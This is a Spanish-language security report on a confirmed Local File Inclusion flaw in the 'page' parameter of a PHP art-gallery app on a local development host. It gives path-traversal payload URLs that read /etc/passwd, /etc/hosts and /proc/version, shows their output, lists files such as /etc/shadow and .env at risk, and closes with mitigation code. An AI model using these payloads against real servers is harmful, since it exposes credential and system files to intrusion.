# Informe de Análisis de Seguridad - Local File Inclusion (LFI)

**Fecha:** 2026-04-30 15:59:08  
**Objetivo:** http://web.dev.local:8081  
**Tipo de Análisis:** Local File Inclusion (LFI)  
**Resultado:** VULNERABILIDAD CONFIRMADA Y EXPLOTADA

---

## 1. Resumen Ejecutivo

Se ha identificado y explotado con éxito una vulnerabilidad de tipo **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual". La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de archivos del servidor mediante la manipulación del parámetro `page` en el endpoint `gallery.php`.

---

## 2. Información del Sistema

- **URL objetivo:** http://web.dev.local:8081
- **Aplicación:** Galería de Arte Virtual (PHP)
- **Sistema operativo del servidor:** Linux (Ubuntu)
- **Kernel:** Linux version 6.8.0-110-generic (Ubuntu 13.3.0-6ubuntu2~24.04.1)
- **IP del servidor (contenedor):** 172.19.0.2

---

## 3. Descripción de la Vulnerabilidad

### 3.1 Localización

| Campo | Valor |
|-------|-------|
| **URL vulnerable** | `http://web.dev.local:8081/gallery.php` |
| **Parámetro vulnerable** | `page` |
| **Tipo** | Local File Inclusion (LFI) |
| **Método HTTP** | GET |
| **CVSS estimado** | 7.5 (Alto) |

### 3.2 Descripción Técnica

La aplicación utiliza el parámetro `page` para incluir dinámicamente archivos de contenido sin aplicar ninguna validación ni sanitización de la entrada. Esto permite a un atacante utilizar secuencias de **path traversal** (`../`) para navegar por el sistema de archivos y forzar la inclusión de archivos arbitrarios fuera del directorio web raíz.

**Código vulnerable (comportamiento inferido):**
```php
// gallery.php - comportamiento vulnerable
$page = $_GET['page'];
include($page . '.php');  // o sin extensión forzada
```

---

## 4. Pruebas de Explotación

### 4.1 Lectura de `/etc/passwd`

**Payload:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/passwd
```

**Resultado:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

✅ **ÉXITO** - Se logró leer el archivo de usuarios del sistema.

### 4.2 Lectura de `/etc/hosts`

**Payload:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/hosts
```

**Resultado:**
```
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::	ip6-localnet
ff00::	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.19.0.2	d5054e367753
```

✅ **ÉXITO** - Se confirmó que el servidor es un contenedor Docker con IP 172.19.0.2.

### 4.3 Lectura de `/proc/version`

**Payload:**
```
http://web.dev.local:8081/gallery.php?page=../../../proc/version
```

**Resultado:**
```
Linux version 6.8.0-110-generic (buildd@lcy02-amd64-115) (x86_64-linux-gnu-gcc-13 (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0, GNU ld (GNU Binutils for Ubuntu) 2.42) #110-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 19 15:09:20 UTC 2026
```

✅ **ÉXITO** - Se obtuvo información detallada del kernel del sistema.

---

## 5. Impacto

| Categoría | Impacto |
|-----------|---------|
| **Confidencialidad** | **ALTO** - Lectura de archivos sensibles del sistema (passwd, configuraciones, logs) |
| **Integridad** | **BAJO** - La vulnerabilidad LFI básica no permite escritura directa |
| **Disponibilidad** | **BAJO** - No afecta directamente la disponibilidad |

### Archivos en riesgo potencial:
- `/etc/passwd` - Lista de usuarios del sistema ✅ Leído
- `/etc/shadow` - Contraseñas hasheadas (si permisos lo permiten)
- `/etc/hosts` - Configuración de red ✅ Leído
- `/proc/version` - Información del kernel ✅ Leído
- Archivos de configuración de aplicaciones (`.env`, `config.php`, etc.)
- Logs del servidor web (`/var/log/apache2/access.log`, etc.)
- Código fuente de la aplicación

---

## 6. Recomendaciones de Mitigación

1. **Validar la entrada del usuario:** Nunca usar directamente parámetros de usuario en funciones de inclusión de archivos.

2. **Usar una lista blanca (whitelist):** Solo permitir valores específicos y conocidos para el parámetro `page`:
   ```php
   $allowed_pages = ['modern', 'classic', 'abstract', 'about'];
   if (in_array($_GET['page'], $allowed_pages)) {
       include($_GET['page'] . '.php');
   }
   ```

3. **Sanitizar y normalizar rutas:** Usar `realpath()` y verificar que el archivo resuelto esté dentro del directorio permitido:
   ```php
   $base_dir = realpath('/var/www/html/pages/');
   $requested = realpath($base_dir . '/' . $_GET['page'] . '.php');
   if (strpos($requested, $base_dir) === 0) {
       include($requested);
   }
   ```

4. **Deshabilitar funciones PHP peligrosas:** Configurar `open_basedir` en `php.ini` para restringir el acceso a directorios específicos.

5. **Principio de mínimo privilegio:** El proceso del servidor web debe ejecutarse con los mínimos permisos necesarios.

---

## 7. Conclusión

La aplicación web "Galería de Arte Virtual" presenta una vulnerabilidad crítica de tipo LFI en el parámetro `page` del fichero `gallery.php`. Esta vulnerabilidad fue **confirmada y explotada con éxito**, logrando leer archivos sensibles del sistema como `/etc/passwd`, `/etc/hosts` y `/proc/version`. Se recomienda corregir esta vulnerabilidad de forma inmediata aplicando las mitigaciones descritas en la sección anterior.

---

*Informe generado automáticamente - Análisis de seguridad autorizado*
